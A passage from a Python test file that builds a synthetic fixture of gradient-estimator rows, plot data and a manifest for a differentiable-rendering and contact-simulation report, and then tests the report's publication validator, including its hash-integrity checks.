            "held_out_loss_mean": 0.5,
            "source_row_ids": [
                row["row_id"] for row in rows if row["method"] == method
            ],
        }
        for method in sorted(
            ("soft_ad", "straight_through_ad", "residual_control_variate")
        )
    ]


def _contact_optimization_validity(rows: list[dict[str, object]]) -> dict[str, object]:
    successful_methods = [row["method"] for row in rows if row["success"]]
    return {
        "scenario": "contact_3d_optimization",
        "accepted": True,
        "metrics": {
            "row_count": len(rows),
            "accepted_count": len(rows),
            "success_count": len(successful_methods),
            "successful_methods": successful_methods,
        },
        "source_row_ids": [row["row_id"] for row in rows],
    }


def make_valid_fixture(test: unittest.TestCase) -> Path:
    temporary = tempfile.TemporaryDirectory()
    test.addCleanup(temporary.cleanup)
    root = Path(temporary.name)
    (root / "data/raw").mkdir(parents=True)
    (root / "data/plot_data").mkdir(parents=True)
    (root / "assets/figures").mkdir(parents=True)
    (root / "assets/images").mkdir(parents=True)

    method_rows = [
        {
            "row_id": f"analytic:{method}",
            "scenario_family": "analytic",
            "method": method,
            "scenario": "step",
            "target": "x",
            "samples": 1,
            "antithetic": False,
            "outer_seed": 0,
            "inner_seed": 0,
            "start_id": "analytic",
            "value": 0.5,
            "gradient": [0.0],
            "reference_gradient": [0.0],
            "relative_error": None,
            "cosine_similarity": None,
            "sign_agreement": None,
            "forward_executions": 1,
            "hard_forward_executions": None,
            "soft_forward_executions": None,
            "backward_executions": 0,
            "independent_contributions": 1,
            "parameter_perturbations": 1,
            "contribution_variance_available": False,
            "gradient_variance_available": False,
            "contribution_variance": None,
            "gradient_variance": None,
            "ci_low": None,
            "ci_high": None,
            "wall_time": 0.01,
            "target_label": "analytic",
            "device": "cpu",
            "source_commit": "1" * 40,
        }
        for method in REQUIRED_METHOD_IDS
    ]
    residual_row = next(
        row for row in method_rows if row["method"] == "residual_control_variate"
    )
    residual_row.update(
        samples=1,
        antithetic=False,
        parameter_perturbations=1,
        hard_forward_executions=1,
        soft_forward_executions=1,
        forward_executions=2,
        backward_executions=1,
        independent_contributions=1,
    )
    for row in method_rows:
        if row["method"] in {
            "crisp_ad",
            "smoothed_pathwise",
            "soft_ad",
            "straight_through_ad",
        }:
            row["backward_executions"] = 1
        elif row["method"] in {"crisp_fd", "smoothed_crn_fd"}:
            row.update(
                forward_executions=3,
                backward_executions=0,
                parameter_perturbations=2,
                independent_contributions=1,
            )
    path_method_rows = []
    for samples in REPORT_CONFIG["smoothing_samples"]:
        for seed_index in range(REPORT_CONFIG["estimator_seeds"]):
            outer_seed = 10000 + seed_index
            inner_seed = 1000 + seed_index
            common = {
                "scenario_family": "path_tracer",
                "samples": samples,
                "outer_seed": outer_seed,
                "inner_seed": inner_seed,
                "scenario": "analytic_five_sphere",
                "start_id": "initial_parameters",
                "antithetic": True,
                "gradient": [0.0, 0.0, 0.0],
                "reference_gradient": [0.0, 0.0, 0.0],
                "contribution_variance_available": True,
                "gradient_variance_available": True,
                "contribution_variance": [0.0, 0.0, 0.0],
                "gradient_variance": [0.0, 0.0, 0.0],
                "ci_low": [0.0, 0.0, 0.0],
                "ci_high": [0.0, 0.0, 0.0],
            }
            path_method_rows.append(
                {
                    **method_rows[2],
                    **common,
                    "row_id": f"path:smoothed_pathwise:{samples}:{outer_seed}",
                    "method": "smoothed_pathwise",
                    "target": "gaussian_smoothed_hard",
                    "target_label": (
                        "pathwise samples of the box-clipped hard render; "
                        "visibility-boundary terms are omitted"
                    ),
                    "unbiased_target": False,
                    "certificate_fingerprint": None,
                    "numerical_gauge_assumption": False,
                    "numerical_gauge_sites": 0,
                    "config": _path_method_config(inner_seed, "smoothed_pathwise"),
                    "forward_executions": samples,
                    "backward_executions": samples,
                    "independent_contributions": samples // 2,
                    "parameter_perturbations": samples,
                    "hard_forward_executions": None,
                    "soft_forward_executions": None,
                }
            )
            path_method_rows.append(
                {
                    **method_rows[3],
                    **common,
                    "row_id": f"path:score:{samples}:{outer_seed}",
                    "method": "score",
                    "target": "gaussian_smoothed_hard",
                    "target_label": "unbiased Gaussian score estimator of the box-clipped hard render",
                    "unbiased_target": True,
                    "certificate_fingerprint": None,
                    "numerical_gauge_assumption": False,
                    "numerical_gauge_sites": 0,
                    "config": _path_method_config(inner_seed, "score"),
                    "forward_executions": samples,
                    "backward_executions": 0,
                    "independent_contributions": samples // 2,
                    "parameter_perturbations": samples,
                    "hard_forward_executions": None,
                    "soft_forward_executions": None,
                }
            )
            path_method_rows.append(
                {
                    **method_rows[4],
                    **common,
                    "row_id": f"path:smoothed_crn_fd:{samples}:{outer_seed}",
                    "method": "smoothed_crn_fd",
                    "target": "gaussian_smoothed_hard_finite_epsilon",
                    "target_label": (
                        "CRN central difference of the Gaussian-smoothed box-clipped hard render"
                    ),
                    "unbiased_target": True,
                    "certificate_fingerprint": None,
                    "numerical_gauge_assumption": False,
                    "numerical_gauge_sites": 0,
                    "config": _path_method_config(inner_seed, "smoothed_crn_fd"),
                    "forward_executions": 7 * samples,
                    "backward_executions": 0,
                    "independent_contributions": 1,
                    "parameter_perturbations": 6,
                    "hard_forward_executions": None,
                    "soft_forward_executions": None,
                    "contribution_variance_available": False,
                    "gradient_variance_available": False,
                    "contribution_variance": None,
                    "gradient_variance": None,
                    "ci_low": None,
                    "ci_high": None,
                }
            )
            path_method_rows.append(
                {
                    **residual_row,
                    **common,
                    "row_id": f"path:residual_control_variate:{samples}:{outer_seed}",
                    "method": "residual_control_variate",
                    "target": PATH_GAUGE_TARGET,
                    "target_label": PATH_GAUGE_TARGET_LABEL,
                    "unbiased_target": True,
                    "certificate_fingerprint": PATH_CERTIFICATE_FINGERPRINT,
                    "numerical_gauge_assumption": True,
                    "numerical_gauge_sites": 5,
                    "config": _path_method_config(
                        inner_seed, "residual_control_variate"
                    ),
                    "forward_executions": 2 * samples,
                    "backward_executions": samples,
                    "independent_contributions": samples // 2,
                    "parameter_perturbations": samples,
                    "hard_forward_executions": samples,
                    "soft_forward_executions": samples,
                }
            )
    deterministic_specs = {
        "crisp_ad": {
            "target": "hard_program",
            "target_label": (
                "local derivative of the box-clipped hard-render execution path"
            ),
            "unbiased_target": True,
            "forward_executions": 1,
            "backward_executions": 1,
            "parameter_perturbations": 1,
        },
        "crisp_fd": {
            "target": "hard_program_central_difference",
            "target_label": "central finite difference of the box-clipped hard render",
            "unbiased_target": True,
            "forward_executions": 7,
            "backward_executions": 0,
            "parameter_perturbations": 6,
        },
        "soft_ad": {
            "target": "local_soft_surrogate",
            "target_label": (
                "AD of the source-smoothed box-clipped path-tracing surrogate"
            ),
            "unbiased_target": True,
            "forward_executions": 1,
            "backward_executions": 1,
            "parameter_perturbations": 1,
        },
        "straight_through_ad": {
            "target": "hard_primal_local_soft_pseudogradient",
            "target_label": (
                "box-clipped hard rendered primal with a source-smoothed pseudo-gradient"
            ),
            "unbiased_target": None,
            "forward_executions": 1,
            "backward_executions": 1,
            "parameter_perturbations": 1,
        },
    }
    templates = {row["method"]: row for row in method_rows}
    for seed_index in range(REPORT_CONFIG["estimator_seeds"]):
        outer_seed = 10000 + seed_index
        inner_seed = 1000 + seed_index
        for method, spec in deterministic_specs.items():
            path_method_rows.append(
                {
                    **templates[method],
                    "row_id": f"path:{method}:1:{outer_seed}",
                    "scenario_family": "path_tracer",
                    "scenario": "analytic_five_sphere",
                    "start_id": "initial_parameters",
                    "method": method,
                    "target": spec["target"],
                    "target_label": spec["target_label"],
                    "samples": 1,
                    "outer_seed": outer_seed,
                    "inner_seed": inner_seed,
                    "antithetic": False,
                    "gradient": [0.0, 0.0, 0.0],
                    "reference_gradient": [0.0, 0.0, 0.0],
                    "unbiased_target": spec["unbiased_target"],
                    "certificate_fingerprint": None,
                    "numerical_gauge_assumption": False,
                    "numerical_gauge_sites": 0,
                    "config": _path_method_config(inner_seed, method),
                    "forward_executions": spec["forward_executions"],
                    "backward_executions": spec["backward_executions"],
                    "independent_contributions": 1,
                    "parameter_perturbations": spec["parameter_perturbations"],
                    "hard_forward_executions": None,
                    "soft_forward_executions": None,
                    "contribution_variance_available": False,
                    "gradient_variance_available": False,
                    "contribution_variance": None,
                    "gradient_variance": None,
                    "ci_low": None,
                    "ci_high": None,
                }
            )
    path_protocol = _path_protocol_row()
    analytic_anchor = {
        "row_id": "analytic:anchor",
        "scenario_family": "analytic",
        "accepted": True,
    }
    optimization_rows = _path_optimization_rows()
    comparison_images = {
        "comparison_initial": [[[0.2, 0.2, 0.2]]],
        "comparison_target": [[[0.0, 0.0, 0.0]]],
        "comparison_recovered": [[[0.1, 0.1, 0.1]]],
    }
    comparison_rows = [
        {
            "row_id": f"path:{role}",
            "scenario_family": "path_tracer",
            "scenario": "analytic_five_sphere_render",
            "role": role,
            "accepted": True,
            "image": image,
        }
        for role, image in comparison_images.items()
    ]
    triangle_diagnostic = {
        "row_id": "triangle:0",
        "scenario_family": "triangle_2d",
        "scenario": "edge_slice",
        "edge": 0,
        "rows": [
            {
                "signed_offset": -0.1,
                "analytic_intersection": 0.0,
                "hard_intersection": 0.0,
            },
            {
                "signed_offset": 0.1,
                "analytic_intersection": 1.0,
                "hard_intersection": 1.0,
            },
        ],
    }
    collision_diagnostic = {
        "row_id": "collision:0",
        "scenario_family": "collision_2d",
        "scenario": "pinball_bank",
        "start_id": "start_0",
        "outer_seed": 300,
        "final_positions": [[0.0, 0.0], [0.5, 0.25]],
        "losses": [1.0, 0.5],
    }
    contact_gradient = {
        **next(row for row in method_rows if row["method"] == "soft_ad"),
        "row_id": "contact:soft_ad",
        "scenario_family": "contact_3d",
        "scenario": "three_sphere_floor_ramp",
        "start_id": "initial_launch_velocity",
        "target": "launch_velocity",
        "gradient": [0.0, 0.0, 0.0],
        "reference_gradient": [0.0, 0.0, 0.0],
    }
    contact_diagnostic = {
        "row_id": "contact:0",
        "scenario_family": "contact_3d",
        "scenario": "three_sphere_floor_ramp",
        "positions": [[[0.0, 0.0, 0.0]], [[0.1, 0.0, 0.1]]],
        "max_penetration": 0.01,
        "max_contact_energy_gain": 0.02,
    }
    contact_optimization_rows = _contact_optimization_rows()
    optimization_summaries = [
        *_contact_optimization_summaries(contact_optimization_rows),
        *_path_optimization_summaries(optimization_rows),
    ]
    opaque_diagnostic = {
        "row_id": "mesh:0",
        "scenario_family": "opaque_mesh",
        "scenario": "procedural_cube_silhouette",
        "transform_status": "estimator_only",
        "transformable": False,
        "boundary": {"transformed_sites": 0, "preserved_sites": 1},
    }
    opaque_estimator = {
        **method_rows[3],
        "row_id": "mesh:score:8:9000",
        "scenario_family": "opaque_mesh",
        "scenario": "procedural_cube_silhouette",
        "start_id": "camera_parameters",
        "target": "gaussian_smoothed_hard",
        "target_label": "unbiased Gaussian score estimator of the hard native mesh query",
        "samples": 8,
        "outer_seed": 9000,
        "inner_seed": 11000,
        "antithetic": True,
        "gradient": [0.0, 0.0],
        "reference_gradient": [0.0, 0.0],
        "forward_executions": 8,
        "backward_executions": 0,
        "independent_contributions": 4,
        "parameter_perturbations": 8,
        "contribution_variance_available": True,
        "gradient_variance_available": True,
        "contribution_variance": [0.0, 0.0],
        "gradient_variance": [0.0, 0.0],
        "ci_low": [0.0, 0.0],
        "ci_high": [0.0, 0.0],
        "unbiased_target": True,
        "certificate_fingerprint": None,
        "numerical_gauge_assumption": False,
        "numerical_gauge_sites": 0,
        "config": {
            "epsilon": None,
            "forward_budget": 8,
            "mesh_rebuilt_per_sample": False,
            "native_operation": "mesh_query_ray",
            "sigma": [0.055, 0.055],
            "transform_status": "estimator_only",
            "unused_forward_budget": 0,
        },
    }
    raw: dict[str, list[dict[str, object]]] = {name: [] for name in RAW_NAMES}
    raw["analytic.json"] = [*method_rows, analytic_anchor]
    raw["path_tracer_gradients.json"] = [
        *path_method_rows,
        path_protocol,
        *comparison_rows,
    ]
    raw["path_tracer_optimization.json"] = optimization_rows
    raw["triangle_2d.json"] = [triangle_diagnostic]
    raw["collision_2d.json"] = [collision_diagnostic]
    raw["contact_3d_gradients.json"] = [contact_gradient, contact_diagnostic]
    raw["contact_3d_optimization.json"] = contact_optimization_rows
    raw["opaque_mesh.json"] = [opaque_diagnostic, opaque_estimator]
    raw["performance.json"] = [
        {
            "row_id": f"perf:{method}",
            "scenario": "analytic",
            "method": method,
            "wall_time": 0.01,
            "cold_compile_time": 0.02,
            "warm_median": 0.01,
            "warm_iqr": 0.001,
            "warm_repeats": 5,
            "forward_executions": 1,
            "backward_executions": 0,
            "tracemalloc_peak": 1024,
            "tracemalloc_peak_available": True,
            "rss_delta": None,
            "rss_delta_available": False,
            "warp_allocation_peak": None,
            "warp_allocation_peak_available": False,
            "device_free_memory_delta": None,
            "device_free_memory_delta_available": False,
            "device": "cpu",
            "source_commit": "1" * 40,
        }
        for method in REQUIRED_METHOD_IDS
    ]
    reference_rows = []
    for cell_id in EXPECTED_REFERENCE_CELLS:
        samples = 65536 if cell_id.startswith("contact_3d:") else 32768
        canonical_inputs = CANONICAL_REFERENCE_INPUTS[cell_id]
        dimension = len(canonical_inputs["parameters"])
        single_stencil = (
            FIVE_POINT_STENCIL_FORWARD_EVALUATIONS_PER_DIMENSION
            * dimension
            * samples
            * REFERENCE_POLICY.replicates
        )
        base_seed, inner_seed, protocol_seed_table = _canonical_reference_seed_protocol(
            cell_id
        )
        reference_row = {
            "row_id": f"reference:{cell_id}",
            "cell_id": cell_id,
            **{name: list(values) for name, values in canonical_inputs.items()},
            "g_h": [[0.0] * dimension for _ in range(REFERENCE_POLICY.replicates)],
            "g_h2": [[0.0] * dimension for _ in range(REFERENCE_POLICY.replicates)],
            "score": [[0.0] * dimension for _ in range(REFERENCE_POLICY.replicates)],
            "counts": {
                "samples": samples,
                "replicates": REFERENCE_POLICY.replicates,
                "h_forward_executions": single_stencil,
                "h2_forward_executions": single_stencil,
                "five_point_forward_executions": 2 * single_stencil,
                "score_forward_executions": REFERENCE_POLICY.replicates * samples,
                "forward_executions": 2 * single_stencil
                + REFERENCE_POLICY.replicates * samples,
            },
            "seeds": {
                name: [
                    _canonical_reference_seed(base_seed, inner_seed, replicate, domain)
                    for replicate in range(REFERENCE_POLICY.replicates)
                ]
                for domain, name in enumerate(
                    (
                        "five_point_outer",
                        "five_point_inner",
                        "score_outer",
                        "score_inner",
                    )
                )
            },
            "tier": "report",
            "device": "cpu",
            "source_commit": "1" * 40,
        }
        if protocol_seed_table is not None:
            reference_row["protocol_seed_table"] = protocol_seed_table
            reference_row["protocol_seed_inputs"] = {
                "reference_base": base_seed,
                "reference_inner_base": inner_seed,
            }
        _populate_reference_evidence(reference_row)
        reference_rows.append(reference_row)
    raw["references.json"] = reference_rows
    for name, rows in raw.items():
        write_fixture_json(
            root / "data/raw" / name,
            {
                "schema_version": SCHEMA_VERSION,
                "dataset": name.removesuffix(".json"),
                "rows": rows,
            },
        )

    method_summaries = [
        {
            "scenario": "analytic:step:analytic",
            "target": "x",
            "method": row["method"],
            "samples": 1,
            "mean_gradient": [0.0],
            "relative_error": None,
            "cosine_similarity": None,
            "sign_agreement": None,
            "empirical_bias": [0.0],
            "empirical_variance": [0.0],
            "mean_squared_error": [0.0],
            "source_row_ids": [row["row_id"]],
        }
        for row in method_rows
    ]
    for method, spec in deterministic_specs.items():
        selected = [row for row in path_method_rows if row["method"] == method]
        method_summaries.append(
            {
                "scenario": "path_tracer:analytic_five_sphere:initial_parameters",
                "target": spec["target"],
                "method": method,
                "samples": 1,
                "mean_gradient": [0.0, 0.0, 0.0],
                "relative_error": None,
                "cosine_similarity": None,
                "sign_agreement": None,
                "empirical_bias": [0.0, 0.0, 0.0],
                "empirical_variance": [0.0, 0.0, 0.0],
                "mean_squared_error": [0.0, 0.0, 0.0],
                "source_row_ids": [row["row_id"] for row in selected],
            }
        )
    for method, target in (
        ("smoothed_pathwise", "gaussian_smoothed_hard"),
        ("score", "gaussian_smoothed_hard"),
        ("smoothed_crn_fd", "gaussian_smoothed_hard_finite_epsilon"),
        ("residual_control_variate", PATH_GAUGE_TARGET),
    ):
        for samples in REPORT_CONFIG["smoothing_samples"]:
            selected = [
                row
                for row in path_method_rows
                if row["method"] == method and row["samples"] == samples
            ]
            method_summaries.append(
                {
                    "scenario": "path_tracer:analytic_five_sphere:initial_parameters",
                    "target": target,
                    "method": method,
                    "samples": samples,
                    "mean_gradient": [0.0, 0.0, 0.0],
                    "relative_error": None,
                    "cosine_similarity": None,
                    "sign_agreement": None,
                    "empirical_bias": [0.0, 0.0, 0.0],
                    "empirical_variance": [0.0, 0.0, 0.0],
                    "mean_squared_error": [0.0, 0.0, 0.0],
                    "source_row_ids": [row["row_id"] for row in selected],
                }
            )
    method_summaries.extend(
        (
            {
                "scenario": "contact_3d:three_sphere_floor_ramp:initial_launch_velocity",
                "target": "launch_velocity",
                "method": "soft_ad",
                "samples": 1,
                "mean_gradient": [0.0, 0.0, 0.0],
                "relative_error": None,
                "cosine_similarity": None,
                "sign_agreement": None,
                "empirical_bias": [0.0, 0.0, 0.0],
                "empirical_variance": [0.0, 0.0, 0.0],
                "mean_squared_error": [0.0, 0.0, 0.0],
                "source_row_ids": [contact_gradient["row_id"]],
            },
            {
                "scenario": "opaque_mesh:procedural_cube_silhouette:camera_parameters",
                "target": "gaussian_smoothed_hard",
                "method": "score",
                "samples": 8,
                "mean_gradient": [0.0, 0.0],
                "relative_error": None,
                "cosine_similarity": None,
                "sign_agreement": None,
                "empirical_bias": [0.0, 0.0],
                "empirical_variance": [0.0, 0.0],
                "mean_squared_error": [0.0, 0.0],
                "source_row_ids": [opaque_estimator["row_id"]],
            },
        )
    )
    method_summaries.sort(
        key=lambda row: (
            str(row["scenario"]),
            str(row["target"]),
            str(row["method"]),
            int(row["samples"]),
        )
    )
    plot_rows = {
        "analytic_gates.json": [
            {
                "plot_id": "analytic-gates",
                "values": [0.0, 0.0, 0.0],
                "source_row_ids": [row["row_id"] for row in raw["analytic.json"]],
            }
        ],
        "gradient_quality.json": [
            {
                "plot_id": "triangle-edge-slice-0",
                "kind": "triangle_edge_slice",
                "scenario": "triangle_2d:edge_slice",
                "edge": 0,
                "x_values": [-0.1, 0.1],
                "values": [0.0, 1.0],
                "hard_values": [0.0, 1.0],
                "source_row_ids": [triangle_diagnostic["row_id"]],
            },
            *[
                {
                    "plot_id": f"path-tracer-gradient-quality-{index}",
                    "kind": "path_tracer_gradient_quality",
                    "scenario": row["scenario"],
                    "method": row["method"],
                    "values": [row["relative_error"]],
                    "source_row_ids": row["source_row_ids"],
                }
                for index, row in enumerate(method_summaries)
                if str(row["scenario"]).startswith("path_tracer:")
            ],
            *[
                {
                    "plot_id": f"contact-3d-gradient-quality-{index}",
                    "kind": "contact_3d_gradient_quality",
                    "scenario": row["scenario"],
                    "method": row["method"],
                    "values": [row["relative_error"]],
                    "source_row_ids": row["source_row_ids"],
                }
                for index, row in enumerate(method_summaries)
                if str(row["scenario"]).startswith("contact_3d:")
            ],
        ],
        "bias_variance.json": [
            {
                "plot_id": f"bias-variance-{index}",
                "scenario": row["scenario"],
                "method": row["method"],
                "values": row["mean_squared_error"],
                "source_row_ids": row["source_row_ids"],
            }
            for index, row in enumerate(method_summaries)
        ],
        "optimization.json": [
            *[
                {
                    "plot_id": f"optimization-{index}",
                    "scenario": row["scenario"],
                    "method": row["method"],
                    "values": [
                        row["final_hard_loss_mean"],
                        row["held_out_loss_mean"],
                    ],
                    "source_row_ids": row["source_row_ids"],
                }
                for index, row in enumerate(optimization_summaries)
            ],
            {
                "plot_id": "path-render-comparison",
                "kind": "path_render_comparison",
                "scenario": "path_tracer",
                "method": "best_recovered_render",
                "values": [0.04000000000000001, 0.010000000000000002],
                "source_row_ids": [row["row_id"] for row in comparison_rows],
                "path_target_image": comparison_images["comparison_target"],
                "path_initial_image": comparison_images["comparison_initial"],
                "path_recovered_image": comparison_images["comparison_recovered"],
            },
        ],
        "validity.json": [
            {
                "plot_id": "collision-pinball_bank-start_0-300",
                "kind": "collision_trajectory",
                "scenario": "collision_2d:pinball_bank",
                "final_positions": collision_diagnostic["final_positions"],
                "values": collision_diagnostic["losses"],
                "source_row_ids": [collision_diagnostic["row_id"]],
            },
            {
                "plot_id": "contact-3d-trajectories",
                "kind": "contact_trajectory",
                "scenario": "contact_3d",
                "positions": contact_diagnostic["positions"],
                "values": [
                    contact_diagnostic["max_penetration"],
                    contact_diagnostic["max_contact_energy_gain"],
                ],
                "source_row_ids": [contact_diagnostic["row_id"]],
            },
            {
                "plot_id": "opaque-mesh-boundary",
                "kind": "opaque_boundary",
                "scenario": "opaque_mesh",
                "values": [0, 1],
                "labels": ["transformed", "preserved"],
                "source_row_ids": [opaque_diagnostic["row_id"]],
            },
        ],
        "performance.json": [
            {
                "plot_id": f"performance-{index}",
                "scenario": row["scenario"],
                "method": row["method"],
                "values": [
                    row["cold_compile_time"],
                    row["warm_median"],
                    row["warm_iqr"],
                ],
                "source_row_ids": [row["row_id"]],
            }
            for index, row in enumerate(raw["performance.json"])
        ],
    }
    for name, rows in plot_rows.items():
        write_fixture_json(
            root / "data/plot_data" / name,
            {
                "schema_version": SCHEMA_VERSION,
                "dataset": name.removesuffix(".json"),
                "rows": rows,
            },
        )

    performance_summaries = [
        {
            "scenario": row["scenario"],
            "method": row["method"],
            "cold_compile_time": row["cold_compile_time"],
            "warm_median": row["warm_median"],
            "warm_iqr": row["warm_iqr"],
            "forward_executions": row["forward_executions"],
            "backward_executions": row["backward_executions"],
            "tracemalloc_peak": row["tracemalloc_peak"],
            "rss_delta": row["rss_delta"],
            "warp_allocation_peak": row["warp_allocation_peak"],
            "device_free_memory_delta": row["device_free_memory_delta"],
            "source_row_ids": [row["row_id"]],
        }
        for row in raw["performance.json"]
    ]
    validity_groups = {
        "analytic": [analytic_anchor],
        "triangle_2d": raw["triangle_2d.json"],
        "collision_2d": raw["collision_2d.json"],
        "path_tracer": [path_protocol, *comparison_rows],
        "contact_3d": [contact_diagnostic],
        "opaque_mesh": [opaque_diagnostic],
        "references": reference_rows,
    }
    summary = {
        "schema_version": SCHEMA_VERSION,
        "method_labels": {method: method for method in REQUIRED_METHOD_IDS},
        "scenario_families": [
            "analytic",
            "triangle_2d",
            "collision_2d",
            "path_tracer",
            "contact_3d",
            "opaque_mesh",
        ],
        "literature_urls": list(REQUIRED_LITERATURE_URLS),
        "headline_metrics": {
            "analytic_anchor_accepted": {
                "value": 1,
                "unit": "boolean",
                "source_row_ids": [analytic_anchor["row_id"]],
            },
            "path_best_held_out_loss": {
                "value": 0.5,
                "unit": "mean_squared_error",
                "source_row_ids": [optimization_rows[0]["row_id"]],
            },
        },
        "method_summaries": method_summaries,
        "optimization_summaries": optimization_summaries,
        "performance_summaries": performance_summaries,
        "runtime": _report_runtime_record(),
        "scenario_validity": [
            {
                "scenario": scenario,
                "accepted": True,
                "metrics": {
                    "row_count": len(rows),
                    "accepted_count": len(rows),
                },
                "source_row_ids": [row["row_id"] for row in rows],
            }
            for scenario, rows in validity_groups.items()
        ]
        + [_contact_optimization_validity(contact_optimization_rows)],
    }
    write_fixture_json(root / "data/summary.json", summary)
    for name in FIGURE_NAMES:
        (root / "assets/figures" / name).write_bytes(PNG_BYTES)
    for name in IMAGE_NAMES:
        (root / "assets/images" / name).write_bytes(PNG_BYTES)

    applicability = [
        {
            "scenario": "analytic",
            "method": method,
            "samples": 1,
            "stochastic": False,
            "antithetic": False,
            "report_required": True,
            "estimator_only": False,
            "applicable": True,
            "transformable": True,
            "optimization_enabled": False,
            "reference_required": False,
            "reason": None,
        }
        for method in REQUIRED_METHOD_IDS
    ]
    path_stochastic_methods = {
        "smoothed_pathwise",
        "score",
        "smoothed_crn_fd",
        "residual_control_variate",
    }
    for method in (
        "smoothed_pathwise",
        "score",
        "smoothed_crn_fd",
        "residual_control_variate",
    ):
        for samples in REPORT_CONFIG["smoothing_samples"]:
            applicability.append(
                {
                    "scenario": "path_tracer",
                    "method": method,
                    "samples": samples,
                    "stochastic": True,
                    "antithetic": True,
                    "report_required": True,
                    "estimator_only": False,
                    "applicable": True,
                    "transformable": True,
                    "optimization_enabled": True,
                    "reference_required": True,
                    "reason": None,
                }
            )
    for scenario in (
        "triangle_2d",
        "collision_2d",
        "path_tracer",
        "contact_3d",
        "opaque_mesh",
    ):
        for method in REQUIRED_METHOD_IDS:
            if scenario == "path_tracer" and method in path_stochastic_methods:
                continue
            path_deterministic = scenario == "path_tracer"
            applicability.append(
                {
                    "scenario": scenario,
                    "method": method,
                    "samples": 1,
                    "stochastic": False,
                    "antithetic": False,
                    "report_required": path_deterministic,
                    "estimator_only": scenario == "opaque_mesh",
                    "applicable": path_deterministic,
                    "transformable": path_deterministic,
                    "optimization_enabled": path_deterministic
                    and method in {"crisp_ad", "soft_ad", "straight_through_ad"},
                    "reference_required": False,
                    "reason": (
                        None
                        if path_deterministic
                        else "fixture cell is intentionally unsupported"
                    ),
                }
            )
    manifest = {
        "schema_version": SCHEMA_VERSION,
        "tier": "report",
        "source": {
            "commit": "1" * 40,
            "dirty": False,
            "command": [
                "uv",
                "run",
                "--extra",
                "examples",
                "-m",
                "warp.examples.optim.example_program_smoothing",
                "--device",
                "cpu",
                "--tier",
                "report",
                "--output-dir",
                "$OUTPUT_DIR",
                "--headless",
            ],
            "python": "3.12",
            "warp": "test",
            "platform": "test",
            "compiler": "test",
            "device": "cpu",
            "cpu_model": "test",
            "cpu_threads": 1,
            "seeds": {
                "analytic_estimator_outer": list(range(100, 132)),
                "collision_estimator_outer": list(range(300, 332)),
                "contact_3d": {
                    "estimator_outer": list(range(5000, 5032)),
                    "optimization_outer": [
                        6000 + 64 * schedule for schedule in range(16)
                    ],
                    "reference_base": 302,
                    "reference_inner_base": 402,
                },
                "opaque_mesh": {
                    "estimator_outer": list(range(9000, 9032)),
                    "reference_base": 10000,
                    "reference_inner_base": 11000,
                },
                "path_tracer": {
                    "training": list(range(1000, 1032)),
                    "target": list(range(2000, 2016)),
                    "held_out": list(range(3000, 3016)),
                    "reference_base": 4000,
                    "reference_inner_base": 4001,
                    "estimator_outer": list(range(10000, 10032)),
                },
                "triangle_estimator_outer": list(range(200, 232)),
            },
        },
        "config": dict(REPORT_CONFIG),
        "accepted": {"analytic": True, "references": True, "scenario_validity": True},
        "report_reference_count_decision": dict(
            REAL_V2_REPORT_REFERENCE_COUNT_DECISION
        ),
        "reference_required_cells": list(EXPECTED_REFERENCE_CELLS),
        "applicability": applicability,
        "files": {},
    }
    write_fixture_json(root / "data/manifest.json", manifest)
    _refresh_manifest(root)

    from discograd import build_report

    (root / "index.html").write_bytes(
        build_report.render_report(root=root, template_path=REPORT_TEMPLATE)
    )
    return root


class PublicationValidationTests(unittest.TestCase):
    def test_reference_policy_is_frozen_and_derives_protocol_constants(self):
        policy = getattr(validate_report_module, "REFERENCE_POLICY", None)
        self.assertIsNotNone(policy)
        assert policy is not None
        self.assertEqual(policy.richardson_denominator, 15)
        self.assertEqual(policy.degrees_of_freedom, 3)
        self.assertEqual(policy.replicates, 4)
        self.assertEqual(policy.student_t_critical, 3.182446305284263)
        self.assertEqual(
            dict(REFERENCE_TRUNCATION_POLICY),
            {
                "richardson_order": 4,
                "refinement_ratio": 2,
                "confidence": 0.95,
                "statistical_budget_fraction": 0.25,
                "roundoff_floor_ulps": 64,
                "confidence_scope": "componentwise_not_simultaneous",
            },
        )
        with self.assertRaises(dataclasses.FrozenInstanceError):
            policy.replicates = 5
        with self.assertRaises(TypeError):
            REFERENCE_TRUNCATION_POLICY["confidence"] = 0.9

    def test_valid_fixture_is_accepted(self):
        root = make_valid_fixture(self)
        manifest = json.loads((root / "data/manifest.json").read_text(encoding="utf-8"))
        summary = json.loads((root / "data/summary.json").read_text(encoding="utf-8"))
        path_rows = json.loads(
            (root / "data/raw/path_tracer_gradients.json").read_text(encoding="utf-8")
        )["rows"]
        path_optimization_rows = json.loads(
            (root / "data/raw/path_tracer_optimization.json").read_text(
                encoding="utf-8"
            )
        )["rows"]
        protocol = next(
            row
            for row in path_rows
            if row.get("scenario") == "path_randomness_protocol"
        )
        self.assertEqual(manifest["config"], REPORT_CONFIG)
        self.assertEqual(
            manifest["report_reference_count_decision"],
            REAL_V2_REPORT_REFERENCE_COUNT_DECISION,
        )
        self.assertEqual(
            summary["runtime"]["elapsed_measurement"],
            "through_one_complete_descriptor_relative_install_pass",
        )
        self.assertEqual(
            set(summary["runtime"]["phase_seconds"]), set(REPORT_RUNTIME_PHASES)
        )
        self.assertEqual(
            protocol["certificate"]["fingerprint"], PATH_CERTIFICATE_FINGERPRINT
        )
        self.assertEqual(
            protocol["certificate"]["root_callable_keys"], list(PATH_ROOT_CALLABLE_KEYS)
        )
        self.assertEqual(
            protocol["certificate"]["callable_keys"], list(PATH_CALLABLE_KEYS)
        )
        self.assertEqual(len(path_optimization_rows), 64)
        self.assertEqual(
            {(row["method"], row["schedule_id"]) for row in path_optimization_rows},
            {
                (method, schedule)
                for method in PATH_OPTIMIZATION_METHODS
                for schedule in range(16)
            },
        )

        result = validate_publication(root)
        self.assertEqual(result["files"], 31)
        self.assertGreater(result["rows"], 32)

    def test_publication_semantics_use_the_validated_bundle_snapshot(self):
        root = make_valid_fixture(self)
        real_validate_manifest = validate_report_module.validate_manifest
        with mock.patch.object(
            validate_report_module,
            "validate_manifest",
            wraps=real_validate_manifest,
        ) as validate_manifest:
            validate_publication(root)
        self.assertEqual(validate_manifest.call_count, 1)

    def test_malformed_hashed_png_cannot_be_rescued_by_post_hash_path_swap(self):
        root = make_valid_fixture(self)
        asset = root / "assets/figures/analytic_gates.png"
        asset.write_bytes(b"malformed PNG bytes accepted by the manifest hash")
        _refresh_manifest(root)

        real_validate_protocol = validate_report_module._validate_protocol

        def validate_protocol_after_swap(manifest, loaded):
            asset.write_bytes(PNG_BYTES)
            return real_validate_protocol(manifest, loaded)

        with mock.patch.object(
            validate_report_module,
